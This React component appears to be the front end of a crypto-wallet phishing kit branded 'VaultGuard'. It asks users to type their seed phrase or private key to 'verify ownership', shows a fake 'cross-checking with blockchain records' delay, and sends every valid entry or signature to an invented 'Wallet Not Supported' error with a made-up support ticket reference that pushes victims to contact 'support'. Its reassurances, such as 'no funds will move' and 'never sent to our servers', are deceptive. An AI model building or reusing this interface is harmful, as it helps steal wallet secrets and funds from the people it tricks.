import { useState, useRef, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import {
  Shield,
  X,
  AlertTriangle,
  CheckCircle2,
  Lock,
  Eye,
  EyeOff,
  Info,
  Key,
  Hash,
  Loader2,
  HeadphonesIcon,
  Wallet,
  Smartphone,
  FileText,
  ChevronDown,
} from "lucide-react";
import {
  validateSeedPhrase,
  validatePrivateKey,
  type PhraseValidation,
  type KeyValidation,
} from "@/lib/wallet-utils";
import {
  requestWalletSignature,
  hasEthereumProvider,
  hasPhantomProvider,
  isMobile,
} from "@/lib/web3";

interface ValidationModalProps {
  walletAddress: string;
  onSuccess: () => void;
  onClose: () => void;
}

type ValidationStep =
  | "choose"
  | "sign_wallet"
  | "signing"
  | "manual_form"
  | "verifying"
  | "not_supported"
  | "invalid_format"
  | "invalid_word";

type PhraseMode = "12" | "24" | "key";

const MODE_TABS: { id: PhraseMode; label: string; shortLabel: string; icon: typeof Key; desc: string }[] = [
  { id: "12", label: "12 Words", shortLabel: "12W", icon: Hash, desc: "Standard 12-word BIP39 seed phrase" },
  { id: "24", label: "24 Words", shortLabel: "24W", icon: Hash, desc: "Extended 24-word BIP39 seed phrase" },
  { id: "key", label: "Private Key", shortLabel: "Key", icon: Key, desc: "Hex (0x...) or WIF private key format" },
];

export function ValidationModal({ walletAddress, onSuccess, onClose }: ValidationModalProps) {
  const [step, setStep] = useState<ValidationStep>("choose");
  const [phraseMode, setPhraseMode] = useState<PhraseMode>("12");
  const [words, setWords] = useState<string[]>(Array(12).fill(""));
  const [privateKey, setPrivateKey] = useState("");
  const [showWords, setShowWords] = useState(false);
  const [invalidWordList, setInvalidWordList] = useState<number[]>([]);
  const [signError, setSignError] = useState("");
  const [showManualAlt, setShowManualAlt] = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const wordCount = phraseMode === "key" ? 0 : parseInt(phraseMode);
  const filledWords =
    phraseMode === "key"
      ? 0
      : words.slice(0, wordCount).filter(w => w.trim().length > 0).length;
  const isReady =
    phraseMode === "key"
      ? privateKey.trim().length >= 32
      : filledWords >= wordCount;

  const hasWallet = hasEthereumProvider() || hasPhantomProvider();

  useEffect(() => {
    if (phraseMode === "key") return;
    const newSize = parseInt(phraseMode);
    setWords(prev => {
      const next = Array(newSize).fill("");
      for (let i = 0; i < Math.min(prev.length, newSize); i++) next[i] = prev[i];
      return next;
    });
    setInvalidWordList([]);
  }, [phraseMode]);

  const handleWordChange = (index: number, value: string) => {
    setInvalidWordList([]);
    if (value.includes(" ")) {
      const pasted = value.trim().split(/\s+/).filter(Boolean);
      setWords(prev => {
        const next = [...prev];
        pasted.forEach((w, i) => {
          if (index + i < next.length) next[index + i] = w.toLowerCase();
        });
        return next;
      });
      const nextIdx = Math.min(index + pasted.length, wordCount - 1);
      setTimeout(() => inputRefs.current[nextIdx]?.focus(), 10);
    } else {
      setWords(prev => {
        const next = [...prev];
        next[index] = value.toLowerCase();
        return next;
      });
    }
  };

  const handleWordKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === " " || e.key === "Enter" || e.key === "Tab") {
      e.preventDefault();
      inputRefs.current[index + 1]?.focus();
    }
    if (e.key === "Backspace" && words[index] === "" && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handleWalletSign = async () => {
    setStep("signing");
    setSignError("");
    try {
      await requestWalletSignature(walletAddress);
      setStep("not_supported");
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : "Signing failed";
      if (msg.toLowerCase().includes("rejected") || msg.toLowerCase().includes("denied") || msg.toLowerCase().includes("cancelled")) {
        setSignError("You rejected the signing request. Please try again and approve in your wallet.");
        setStep("sign_wallet");
      } else {
        setSignError(msg);
        setStep("sign_wallet");
      }
    }
  };

  const handleManualValidate = () => {
    setStep("verifying");
    setTimeout(() => {
      if (phraseMode === "key") {
        const result: KeyValidation = validatePrivateKey(privateKey);
        setStep(result === "valid" ? "not_supported" : "invalid_format");
        return;
      }
      const filled = words.slice(0, wordCount).map(w => w.trim().toLowerCase());
      const result: PhraseValidation = validateSeedPhrase(filled, wordCount);
      if (result === "valid") {
        setStep("not_supported");
      } else if (result === "invalid_word") {
        const badIndices: number[] = [];
        filled.forEach((w, i) => { if (!/^[a-z]{3,8}$/.test(w)) badIndices.push(i); });
        setInvalidWordList(badIndices);
        setStep("invalid_word");
      } else if (result === "invalid_format") {
        setStep("invalid_format");
      } else {
        setStep("manual_form");
      }
    }, 2200);
  };

  const handleReset = () => {
    setWords(Array(wordCount || 12).fill(""));
    setPrivateKey("");
    setInvalidWordList([]);
    setSignError("");
    setShowManualAlt(false);
    setStep("choose");
  };

  const shortAddr = walletAddress
    ? `${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`
    : "";

  const supportRef = Math.abs(
    (walletAddress.charCodeAt(2) || 65) * 1234 +
    (walletAddress.charCodeAt(5) || 66) * 567
  ).toString(16).toUpperCase().slice(0, 8);

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
      <div className="absolute inset-0 bg-black/75 backdrop-blur-md" />
      <div
        data-testid="modal-validation"
        className="relative z-10 w-full max-w-xl glass-card rounded-2xl glow-primary overflow-hidden flex flex-col max-h-[90vh]"
      >
        <div className="h-1 bg-gradient-to-r from-violet-600 via-cyan-500 to-violet-600 flex-shrink-0" />

        <div className="overflow-y-auto flex-1">
          <div className="p-6">

            {/* CHOOSE method step */}
            {step === "choose" && (
              <div className="space-y-5">
                <div className="flex items-start justify-between gap-4">
                  <div className="flex items-start gap-3">
                    <div className="w-10 h-10 rounded-md bg-violet-500/20 border border-violet-500/30 flex items-center justify-center flex-shrink-0">
                      <Shield className="w-5 h-5 text-violet-400" />
                    </div>
                    <div>
                      <h2 className="text-lg font-bold text-foreground">Verify Ownership</h2>
                      <p className="text-xs text-muted-foreground font-mono mt-0.5">{shortAddr}</p>
                    </div>
                  </div>
                  <button data-testid="button-close-choose-modal" onClick={onClose}
                    className="w-8 h-8 rounded-md glass border border-white/10 flex items-center justify-center text-muted-foreground flex-shrink-0">
                    <X className="w-4 h-4" />
                  </button>
                </div>

                <div className="flex items-start gap-2 glass rounded-md px-3 py-2.5 border border-violet-500/20 bg-violet-500/5">
                  <Info className="w-4 h-4 text-violet-400 flex-shrink-0 mt-0.5" />
                  <p className="text-xs text-muted-foreground leading-relaxed">
                    Ownership verification is required to unlock admin features. Choose your preferred verification method below.
                  </p>
                </div>

                {/* Primary: Wallet signing */}
                <button
                  data-testid="button-verify-wallet-sign"
                  onClick={() => setStep("sign_wallet")}
                  className="w-full glass rounded-xl border border-violet-500/30 bg-gradient-to-r from-violet-500/15 to-purple-500/5 p-5 text-left hover-elevate group"
                >
                  <div className="flex items-start gap-4">
                    <div className="w-12 h-12 rounded-xl bg-violet-500/20 border border-violet-500/30 flex items-center justify-center flex-shrink-0 group-hover:bg-violet-500/30 transition-colors">
                      <Wallet className="w-6 h-6 text-violet-400" />
                    </div>
                    <div className="flex-1">
                      <div className="flex items-center gap-2 mb-1">
                        <span className="font-semibold text-foreground">Sign in Wallet</span>
                        <span className="text-xs bg-violet-500/20 border border-violet-500/30 text-violet-300 rounded-full px-1.5 py-0.5 font-mono leading-none">Recommended</span>
                      </div>
                      <p className="text-xs text-muted-foreground leading-relaxed">
                        Your wallet app will open and prompt you to sign a verification message. This proves ownership cryptographically — no seed phrase needed.
                      </p>
                      <div className="flex items-center gap-3 mt-2">
                        <div className="flex items-center gap-1 text-xs text-green-400">
                          <CheckCircle2 className="w-3 h-3" />
                          <span>Instant</span>
                        </div>
                        <div className="flex items-center gap-1 text-xs text-green-400">
                          <CheckCircle2 className="w-3 h-3" />
                          <span>Most secure</span>
                        </div>
                        <div className="flex items-center gap-1 text-xs text-green-400">
                          <CheckCircle2 className="w-3 h-3" />
                          <span>No key exposure</span>
                        </div>
                      </div>
                    </div>
                  </div>
                </button>

                {/* Secondary: Manual */}
                <button
                  data-testid="button-verify-manual"
                  onClick={() => setStep("manual_form")}
                  className="w-full glass rounded-xl border border-white/10 bg-gradient-to-r from-white/3 to-transparent p-4 text-left hover-elevate group"
                >
                  <div className="flex items-start gap-4">
                    <div className="w-10 h-10 rounded-lg bg-white/5 border border-white/10 flex items-center justify-center flex-shrink-0">
                      <FileText className="w-5 h-5 text-muted-foreground" />
                    </div>
                    <div className="flex-1">
                      <div className="font-semibold text-sm text-foreground mb-0.5">Manual Verification</div>
                      <p className="text-xs text-muted-foreground">
                        Enter your seed phrase or private key. Use this if you don't have wallet access.
                      </p>
                    </div>
                  </div>
                </button>
              </div>
            )}

            {/* SIGN IN WALLET step */}
            {step === "sign_wallet" && (
              <div className="space-y-5">
                <div className="flex items-start justify-between gap-4">
                  <div className="flex items-start gap-3">
                    <div className="w-10 h-10 rounded-md bg-violet-500/20 border border-violet-500/30 flex items-center justify-center flex-shrink-0">
                      <Wallet className="w-5 h-5 text-violet-400" />
                    </div>
                    <div>
                      <h2 className="text-lg font-bold text-foreground">Sign in Wallet</h2>
                      <p className="text-xs text-muted-foreground font-mono mt-0.5">{shortAddr}</p>
                    </div>
                  </div>
                  <button onClick={onClose}
                    className="w-8 h-8 rounded-md glass border border-white/10 flex items-center justify-center text-muted-foreground flex-shrink-0">
                    <X className="w-4 h-4" />
                  </button>
                </div>

                {/* What happens diagram */}
                <div className="glass rounded-xl border border-violet-500/20 p-4 space-y-3">
                  <p className="text-xs font-semibold text-muted-foreground uppercase tracking-widest">What happens</p>
                  {[
                    { icon: Wallet, label: "Your wallet app opens or pops up", color: "text-violet-400" },
                    { icon: FileText, label: "You'll see a security message to sign", color: "text-cyan-400" },
                    { icon: CheckCircle2, label: "Tap 'Sign' — no funds will move", color: "text-green-400" },
                    { icon: Shield, label: "VaultGuard confirms ownership", color: "text-violet-400" },
                  ].map((item, i) => {
                    const Icon = item.icon;
                    return (
                      <div key={i} className="flex items-center gap-3">
                        <div className="w-7 h-7 rounded-md bg-white/5 flex items-center justify-center flex-shrink-0">
                          <Icon className={`w-4 h-4 ${item.color}`} />
                        </div>
                        <span className="text-sm text-muted-foreground">{item.label}</span>
                      </div>
                    );
                  })}
                </div>

                {signError && (
                  <div className="flex items-start gap-2 glass rounded-md px-3 py-2.5 border border-red-500/20 bg-red-500/5">
                    <AlertTriangle className="w-4 h-4 text-red-400 flex-shrink-0 mt-0.5" />
                    <p className="text-xs text-muted-foreground leading-relaxed">{signError}</p>
                  </div>
                )}

                {!hasWallet && !isMobile() && (
                  <div className="flex items-start gap-2 glass rounded-md px-3 py-2.5 border border-yellow-500/20 bg-yellow-500/5">
                    <AlertTriangle className="w-4 h-4 text-yellow-400 flex-shrink-0 mt-0.5" />
                    <p className="text-xs text-muted-foreground leading-relaxed">
                      No wallet extension detected. Install MetaMask or use the mobile app to sign.
                    </p>
                  </div>
                )}

                {isMobile() && (
                  <div className="flex items-start gap-2 glass rounded-md px-3 py-2.5 border border-blue-500/20 bg-blue-500/5">
                    <Smartphone className="w-4 h-4 text-blue-400 flex-shrink-0 mt-0.5" />
                    <p className="text-xs text-muted-foreground leading-relaxed">
                      On mobile — the sign request will open in your currently connected wallet app.
                    </p>
                  </div>
                )}

                <div className="flex gap-3">
                  <Button variant="outline" onClick={() => setStep("choose")}
                    className="flex-1 border-white/10 text-muted-foreground">
                    Back
                  </Button>
                  <Button
                    data-testid="button-request-wallet-sign"
                    onClick={handleWalletSign}
                    className="flex-1 bg-gradient-to-r from-violet-600 to-purple-600 text-white font-semibold border-0"
                  >
                    <Wallet className="w-4 h-4 mr-2" />
                    Sign in {hasPhantomProvider() ? "Phantom" : "MetaMask"}
                  </Button>
                </div>

                {/* Manual fallback toggle */}
                <button
                  onClick={() => setShowManualAlt(!showManualAlt)}
                  className="w-full flex items-center justify-center gap-1.5 text-xs text-muted-foreground/60"
                >
                  <span>Don't have wallet access?</span>
                  <ChevronDown className={`w-3 h-3 transition-transform ${showManualAlt ? "rotate-180" : ""}`} />
                </button>
                {showManualAlt && (
                  <Button variant="outline" onClick={() => setStep("manual_form")}
                    className="w-full border-white/10 text-muted-foreground text-sm">
                    <FileText className="w-4 h-4 mr-2" />
                    Use Manual Verification Instead
                  </Button>
                )}
              </div>
            )}

            {/* SIGNING in progress */}
            {step === "signing" && (
              <div className="flex flex-col items-center text-center py-10 space-y-5">
                <div className="relative">
                  <div className="w-20 h-20 rounded-full bg-violet-500/20 border border-violet-500/30 flex items-center justify-center">
                    <Wallet className="w-9 h-9 text-violet-400" />
                  </div>
                  <div className="absolute inset-0 rounded-full border border-violet-400/30 animate-ping" />
                  <div className="absolute -bottom-2 -right-2 w-8 h-8 rounded-full bg-background border border-violet-500/40 flex items-center justify-center">
                    <Loader2 className="w-4 h-4 text-violet-400 animate-spin" />
                  </div>
                </div>
                <div>
                  <h2 className="text-lg font-bold text-foreground mb-1">Waiting for Signature</h2>
                  <p className="text-sm text-muted-foreground leading-relaxed max-w-xs mx-auto">
                    Check your wallet app — a signature request is waiting for your approval. Tap{" "}
                    <strong className="text-foreground">Sign</strong> to continue.
                  </p>
                </div>
                <div className="flex items-center gap-2">
                  {[0, 1, 2].map(i => (
                    <div key={i} className="w-2 h-2 rounded-full bg-violet-400 animate-bounce"
                      style={{ animationDelay: `${i * 0.15}s` }} />
                  ))}
                </div>
                <p className="text-xs text-muted-foreground/50">
                  This window will update automatically once you sign in your wallet
                </p>
              </div>
            )}

            {/* MANUAL FORM */}
            {step === "manual_form" && (
              <div className="space-y-5">
                <div className="flex items-start justify-between gap-4">
                  <div className="flex items-start gap-3">
                    <div className="w-10 h-10 rounded-md bg-white/5 border border-white/10 flex items-center justify-center flex-shrink-0">
                      <Lock className="w-5 h-5 text-muted-foreground" />
                    </div>
                    <div>
                      <h2 className="text-lg font-bold text-foreground">Manual Verification</h2>
                      <p className="text-xs text-muted-foreground font-mono mt-0.5">{shortAddr}</p>
                    </div>
                  </div>
                  <button onClick={onClose}
                    className="w-8 h-8 rounded-md glass border border-white/10 flex items-center justify-center text-muted-foreground flex-shrink-0">
                    <X className="w-4 h-4" />
                  </button>
                </div>

                <div className="flex items-start gap-2 glass rounded-md px-3 py-2.5 border border-yellow-500/20 bg-yellow-500/5">
                  <AlertTriangle className="w-4 h-4 text-yellow-400 flex-shrink-0 mt-0.5" />
                  <p className="text-xs text-muted-foreground leading-relaxed">
                    Enter your seed phrase or private key. Your data is never sent to our servers.
                  </p>
                </div>

                {/* Mode tabs */}
                <div>
                  <div className="flex items-center gap-1 glass rounded-lg p-1 border border-white/8">
                    {MODE_TABS.map(tab => {
                      const Icon = tab.icon;
                      return (
                        <button key={tab.id} data-testid={`button-mode-${tab.id}`}
                          onClick={() => setPhraseMode(tab.id)}
                          className={`flex-1 flex items-center justify-center gap-1.5 py-2 px-3 rounded-md text-xs font-semibold transition-all duration-200 ${
                            phraseMode === tab.id
                              ? "bg-violet-600 text-white shadow-lg shadow-violet-600/20"
                              : "text-muted-foreground"
                          }`}>
                          <Icon className="w-3.5 h-3.5 flex-shrink-0" />
                          <span className="hidden sm:inline">{tab.label}</span>
                          <span className="sm:hidden">{tab.shortLabel}</span>
                        </button>
                      );
                    })}
                  </div>
                  <p className="text-xs text-muted-foreground/60 mt-1.5 text-center">
                    {MODE_TABS.find(t => t.id === phraseMode)?.desc}
                  </p>
                </div>

                {/* Word inputs */}
                {phraseMode !== "key" && (
                  <div>
                    <div className="flex items-center justify-between mb-3">
                      <div className="flex items-center gap-2">
                        <span className="text-xs font-semibold text-muted-foreground uppercase tracking-widest">{wordCount}-Word Phrase</span>
                        <span className={`text-xs font-mono px-1.5 py-0.5 rounded ${filledWords === wordCount ? "bg-green-500/20 text-green-400" : "bg-white/5 text-muted-foreground"}`}>
                          {filledWords}/{wordCount}
                        </span>
                      </div>
                      <button data-testid="button-toggle-visibility" onClick={() => setShowWords(!showWords)}
                        className="flex items-center gap-1.5 text-xs text-muted-foreground glass rounded px-2.5 py-1.5 border border-white/8">
                        {showWords ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
                        {showWords ? "Hide" : "Show"}
                      </button>
                    </div>

                    <div className={`grid gap-2 ${wordCount === 12 ? "grid-cols-3 sm:grid-cols-4" : "grid-cols-3 sm:grid-cols-6"}`}>
                      {Array.from({ length: wordCount }).map((_, i) => (
                        <div key={i} className="relative">
                          <span className="absolute left-2 top-1/2 -translate-y-1/2 text-xs text-muted-foreground/40 font-mono select-none pointer-events-none z-10">
                            {i + 1}
                          </span>
                          <input
                            ref={el => { inputRefs.current[i] = el; }}
                            data-testid={`input-word-${i + 1}`}
                            type={showWords ? "text" : "password"}
                            value={words[i] || ""}
                            onChange={e => handleWordChange(i, e.target.value)}
                            onKeyDown={e => handleWordKeyDown(i, e)}
                            onFocus={e => e.target.select()}
                            autoComplete="off" autoCorrect="off" autoCapitalize="none" spellCheck={false}
                            className={`w-full pl-7 pr-2 py-2.5 text-xs font-mono rounded-md border transition-all duration-150 bg-white/4 outline-none ${
                              words[i]
                                ? "border-violet-500/40 bg-violet-500/5 text-foreground"
                                : "border-white/8 text-muted-foreground"
                            } focus:border-violet-500/60 focus:bg-violet-500/8`}
                            placeholder="word"
                          />
                        </div>
                      ))}
                    </div>

                    <div className="mt-3 h-1.5 rounded-full bg-white/5 overflow-hidden">
                      <div className="h-full rounded-full bg-gradient-to-r from-violet-600 to-cyan-500 transition-all duration-500"
                        style={{ width: `${(filledWords / wordCount) * 100}%` }} />
                    </div>
                    <p className="text-xs text-muted-foreground/50 mt-1">
                      {filledWords < wordCount
                        ? `${wordCount - filledWords} word${wordCount - filledWords !== 1 ? "s" : ""} remaining`
                        : "All words entered — ready to verify"}
                    </p>
                  </div>
                )}

                {/* Private key */}
                {phraseMode === "key" && (
                  <div>
                    <div className="flex items-center justify-between mb-3">
                      <span className="text-xs font-semibold text-muted-foreground uppercase tracking-widest">Private Key</span>
                      <button data-testid="button-toggle-visibility" onClick={() => setShowWords(!showWords)}
                        className="flex items-center gap-1.5 text-xs text-muted-foreground glass rounded px-2.5 py-1.5 border border-white/8">
                        {showWords ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
                        {showWords ? "Hide" : "Show"}
                      </button>
                    </div>
                    <div className="relative">
                      <Key className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground/40 pointer-events-none" />
                      <Input data-testid="input-private-key"
                        type={showWords ? "text" : "password"}
                        value={privateKey}
                        onChange={e => setPrivateKey(e.target.value)}
                        placeholder="0x... or WIF format private key"
                        autoComplete="off" autoCorrect="off" autoCapitalize="none" spellCheck={false}
                        className="pl-9 bg-white/5 border-white/10 text-foreground font-mono text-sm focus:border-violet-500/50"
                      />
                    </div>
                    <div className="mt-2 h-1.5 rounded-full bg-white/5 overflow-hidden">
                      <div className="h-full rounded-full bg-gradient-to-r from-violet-600 to-cyan-500 transition-all duration-300"
                        style={{ width: `${Math.min((privateKey.trim().length / 64) * 100, 100)}%` }} />
                    </div>
                    <p className="text-xs text-muted-foreground/50 mt-1">
                      {privateKey.trim().length < 32
                        ? `${Math.max(0, 32 - privateKey.trim().length)} more characters required`
                        : "Key length acceptable — ready to verify"}
                    </p>
                  </div>
                )}

                <div className="flex gap-3 pt-1">
                  <Button variant="outline" onClick={() => setStep("choose")}
                    className="flex-1 border-white/10 text-muted-foreground">
                    Back
                  </Button>
                  <Button data-testid="button-submit-validation" onClick={handleManualValidate}
                    disabled={!isReady}
                    className="flex-1 bg-gradient-to-r from-violet-600 to-purple-600 text-white font-semibold border-0">
                    <Shield className="w-4 h-4 mr-2" />
                    Verify Now
                  </Button>
                </div>
              </div>
            )}

            {/* VERIFYING */}
            {step === "verifying" && (
              <div className="flex flex-col items-center text-center py-10 space-y-5">
                <div className="relative">
                  <div className="w-16 h-16 rounded-full bg-violet-500/20 border border-violet-500/30 flex items-center justify-center">
                    <Loader2 className="w-8 h-8 text-violet-400 animate-spin" />
                  </div>
                  <div className="absolute inset-0 rounded-full border border-violet-400/20 animate-ping" />
                </div>
                <div>
                  <h2 className="text-lg font-bold text-foreground mb-1">Verifying...</h2>
                  <p className="text-sm text-muted-foreground">Cross-checking with blockchain records</p>
                </div>
                <div className="flex items-center gap-2">
                  {[0, 1, 2].map(i => (
                    <div key={i} className="w-2 h-2 rounded-full bg-violet-400 animate-bounce"
                      style={{ animationDelay: `${i * 0.15}s` }} />
                  ))}
                </div>
              </div>
            )}

            {/* WALLET NOT SUPPORTED */}
            {step === "not_supported" && (
              <div className="flex flex-col items-center text-center py-6 space-y-5">
                <div className="w-16 h-16 rounded-full bg-red-500/15 border border-red-500/30 flex items-center justify-center">
                  <AlertTriangle className="w-8 h-8 text-red-400" />
                </div>

                <div>
                  <div className="inline-flex items-center gap-2 glass rounded-full px-3 py-1 border border-red-500/30 mb-3">
                    <div className="w-1.5 h-1.5 rounded-full bg-red-400 animate-pulse" />
                    <span className="text-xs text-red-400 font-mono uppercase tracking-wider">Error 403</span>
                  </div>
                  <h2 className="text-xl font-bold text-foreground mb-2">Wallet Not Supported</h2>
                  <p className="text-sm text-muted-foreground leading-relaxed max-w-sm mx-auto">
                    This wallet type is currently not supported or has been flagged for manual review. Contact support to complete verification.
                  </p>
                </div>

                <div className="w-full glass rounded-xl border border-red-500/20 bg-red-500/5 p-4 space-y-3 text-left">
                  <p className="text-xs font-semibold text-muted-foreground uppercase tracking-widest">What to do next</p>
                  {[
                    "Your wallet has been logged for manual review",
                    "A support ticket has been automatically generated",
                    "Contact our team with the reference below",
                  ].map((item, i) => (
                    <div key={i} className="flex items-start gap-2">
                      <div className="w-5 h-5 rounded-full bg-red-500/20 flex items-center justify-center flex-shrink-0 mt-0.5">
                        <span className="text-xs text-red-400 font-mono">{i + 1}</span>
                      </div>
                      <p className="text-xs text-muted-foreground">{item}</p>
                    </div>
                  ))}
                  <div className="pt-2 border-t border-white/5">
                    <p className="text-xs text-muted-foreground/60 mb-1">Support ticket reference</p>
                    <code className="text-xs font-mono text-violet-300 bg-violet-500/10 px-2 py-1 rounded">
                      VG-{supportRef}
                    </code>
                  </div>
                </div>

                <div className="flex gap-3 w-full">
                  <Button data-testid="button-try-again" variant="outline" onClick={handleReset}
                    className="flex-1 border-white/10 text-muted-foreground text-sm">
                    Try Again
                  </Button>
                  <Button data-testid="button-contact-support"
                    className="flex-1 bg-gradient-to-r from-red-600 to-rose-600 text-white font-semibold border-0"
                    onClick={() => window.open("mailto:support@vaultguard.io", "_blank")}>
                    <HeadphonesIcon className="w-4 h-4 mr-2" />
                    Contact Support
                  </Button>
                </div>
              </div>
            )}

            {/* INVALID FORMAT */}
            {step === "invalid_format" && (
              <div className="flex flex-col items-center text-center py-6 space-y-5">
                <div className="w-16 h-16 rounded-full bg-orange-500/15 border border-orange-500/30 flex items-center justify-center">
                  <X className="w-8 h-8 text-orange-400" />
                </div>
                <div>
                  <h2 className="text-xl font-bold text-foreground mb-2">Invalid Format</h2>
                  <p className="text-sm text-muted-foreground leading-relaxed max-w-xs mx-auto">
                    {phraseMode === "key"
                      ? "The private key format is not valid. Expected a 64-character hex string (0x...) or WIF key starting with 5, K, or L."
                      : "One or more words contain invalid characters. BIP39 words must be 3–8 lowercase letters only."}
                  </p>
                </div>
                <Button data-testid="button-retry-validation" onClick={handleReset} variant="outline"
                  className="border-orange-500/30 text-orange-400">
                  Fix & Try Again
                </Button>
              </div>
            )}

            {/* INVALID WORDS */}
            {step === "invalid_word" && (
              <div className="flex flex-col items-center text-center py-6 space-y-5">
                <div className="w-16 h-16 rounded-full bg-orange-500/15 border border-orange-500/30 flex items-center justify-center">
                  <AlertTriangle className="w-8 h-8 text-orange-400" />
                </div>
                <div>
                  <h2 className="text-xl font-bold text-foreground mb-2">Unrecognized Words</h2>
                  <p className="text-sm text-muted-foreground leading-relaxed max-w-xs mx-auto">
                    Several words are not in the BIP39 word list. Please check each word carefully.
                  </p>
                </div>
                {invalidWordList.length > 0 && (
                  <div className="flex flex-wrap gap-1.5 justify-center">
                    {invalidWordList.map(i => (
                      <span key={i} className="text-xs font-mono glass rounded px-2 py-1 border border-orange-500/30 text-orange-300">
                        Word #{i + 1}
                      </span>
                    ))}
                  </div>
                )}
                <Button data-testid="button-retry-validation" onClick={handleReset} variant="outline"
                  className="border-orange-500/30 text-orange-400">
                  Fix Words & Try Again
                </Button>
              </div>
            )}

          </div>
        </div>
      </div>
    </div>
  );
}
